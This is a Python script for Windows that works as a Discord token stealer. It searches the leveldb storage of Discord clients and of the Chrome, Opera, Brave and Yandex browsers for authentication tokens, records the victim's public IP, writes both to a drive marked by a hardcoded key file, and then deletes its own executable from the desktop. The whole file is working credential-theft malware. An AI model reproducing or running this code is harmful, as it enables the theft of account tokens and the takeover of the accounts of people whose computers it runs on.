import os
import sys
import re
import win32api

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def token_handler():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        non_duplicates = []
        for i in tokens:
            if i not in non_duplicates:
                non_duplicates.append(i)

        tokens = non_duplicates

        for token in tokens:
            print(f"{platform}: {token}")
            save_data("DISCORD_TOKEN", token)
    print("get discord token successful\n")

def get_publicIP():
    ip = str(os.popen("nslookup myip.opendns.com. resolver1.opendns.com").read()).strip().split()
    ip = ip[7]

    save_data("IP", str(ip))
    print("IP: " + str(ip))
    print("get ip successful\n")
    return ip

def save_data(file_name, data):
    drive = get_drives()
    folder_path = drive + "data\\" + os.environ['COMPUTERNAME'] + "\\"
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    file_path = folder_path + "\\" + file_name + ".txt"
    file = open(file_path, "a+")
    file.write(str(data) + "\n")
    file.close()

def get_drives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]

    for drive in drives:
        path = drive + "KEY.txt"
        if os.path.exists(path):
            with open(path, "r") as file:
                key = str(file.readlines()).strip().replace("['", "").replace("']", "")
                if key == "12738054296097494262348234":
                    return drive
                else:
                    print(key)

def delete_script():
    os.system("del /f desktop/github_script.exe")

def main():
    token_handler()
    get_publicIP()
    delete_script()

main()
